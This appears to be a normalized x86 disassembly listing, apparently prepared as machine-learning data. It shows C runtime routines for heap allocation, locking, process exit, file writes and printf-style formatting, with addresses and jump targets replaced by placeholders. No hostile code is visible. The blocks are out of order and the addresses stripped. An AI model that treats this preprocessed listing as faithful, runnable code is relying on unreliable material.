inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_406d15
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_40734d
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_406d15
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_40623d
pop ecx
call sub_406a86
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_406d76
pop ecx
pop edi
sub_406d8b
push esi
call sub_406e07
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_406dfe
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jb r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_406dfe
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_406dfe
mov [ eax ] 0xd
pop esi
retn
call sub_406dfe
mov [ eax ] 0x8
pop esi
retn
sub_406e5f
push edi
call sub_406f04
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_406f16
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_406f0d
pop edi
retn
push rw-data
push rw-data
call sub_406f16
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_406f30
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
push [ ebp + 0xc ]
call sub_40734d
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
push ebx
call sub_406a86
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
cmp esi 0xffffffe0
ja r-xdata
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_40a8b7
pop ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp esi edi
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
cmp esi edi
jbe r-xdata
cmp [ rw-data ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4070bb
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push ebx
call sub_40b612
add esp 0xc
mov edi eax
mov [ ebp - 0x30 ] edi
test edi edi
je r-xdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp r-xdata
push esi
call sub_40bb4a
pop ecx
test eax eax
jne r-xdata
cmp esi edi
jne r-xdata
cmp [ ebp - 0x24 ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_40b0c0
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_40bb4a
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp esi [ rw-data ]
jae r-xdata
mov [ ebp + 0xc ] esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
push 0x1
pop esi
cmp esi edi
jne r-xdata
push esi
call sub_40ac0b
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x24 ] ebx
jmp r-xdata
push esi
call sub_40bb4a
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ebx esi
shr ebx 0x4
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_40b9da
add esp 0x10
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
push 0x1
pop esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_407209
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
push ebx
call sub_40b6ae
pop ecx
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_405ac0
push ebx
call sub_40a8b7
mov [ ebp - 0x28 ] eax
push ebx
push eax
call sub_40a8e2
add esp 0x18
mov eax esi
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_405ac0
push ebx
push [ ebp - 0x28 ]
call sub_40a8e2
add esp 0x14
mov eax esi
push eax
push ebx
push [ ebp - 0x24 ]
call sub_405ac0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_40b669
add esp 0x18
jmp r-xdata
mov eax esi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
call sub_405ac0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_40b669
add esp 0x18
mov eax esi
sub_40725f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_406d15
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
push esi
call sub_40a8b7
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call sub_40b612
add esp 0xc
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov esi [ ebp - 0x20 ]
mov esi [ esi - 0x4 ]
sub esi 0x9
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi [ ebp - 0x20 ]
movzx esi [ eax ]
shl esi 0x4
mov [ ebp - 0x20 ] esi
jmp r-xdata
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_4072c9
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_407344
cmp [ ebp - 0x28 ] 0x0
sub_40735f
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_40738b
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40bb4a
test eax eax
pop ecx
jne r-xdata
sub_40738b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push 0x9
call sub_406d15
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40ac0b
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4073f2
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
add eax 0xf
and al 0xf0
push eax
push 0x1
pop eax
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp r-xdata
jmp r-xdata
push esi
jmp r-xdata
push 0x9
call sub_406d15
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_40b6ae
pop ecx
mov [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_407451
mov eax [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov [ ebp + 0x8 ] esi
cmp esi [ rw-data ]
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
sub_407490
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_407514
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40bdc5
push esi
call sub_407571
push esi
mov edi eax
call sub_40be24
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_407571
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_40bd83
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_406d8b
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_40bd83
push 0x1
mov edi eax
call sub_40bd83
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_40bd83
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40bd04
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4075f4
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_406a86
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40761f
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_407737
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40be46
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_407737
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40a12a
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_40912f
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_407737
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_40bdc5
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_40779c
push esi
mov edi eax
call sub_40be24
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_40779c
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_409194
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_406dfe
mov [ eax ] 0x1c
call sub_406e07
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_406d8b
pop ecx
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
mov [ eax ] esi
jmp r-xdata
sub_407927
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne r-xdata
jmp [ eax * 4 + jump_table_4080a5 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408163
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge r-xdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408163
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge r-xdata
cmp [ esi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_4080c5
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_4080c5
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x28 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408170
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408163
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x8 ] edx
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408163
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_408163
pop ecx
xor edx edx
call sub_408163
pop ecx
jmp r-xdata
call sub_408163
pop ecx
movzx eax ax
jmp r-xdata
call sub_408163
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je r-xdata
cmp [ ebp - 0x8 ] 0xa3
jle r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
and [ ebp - 0x1c ] 0x0
jl r-xdata
push [ ebp - 0x30 ]
call sub_406a86
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_40734d
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
push edi
call [ rw-data ]
pop ecx
call sub_404f30
pop ecx
jmp r-xdata
test [ ebp - 0x4 ] edi
je r-xdata
call sub_408163
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_408180
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_40a5a0
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408163
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp r-xdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rw-data ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne r-xdata
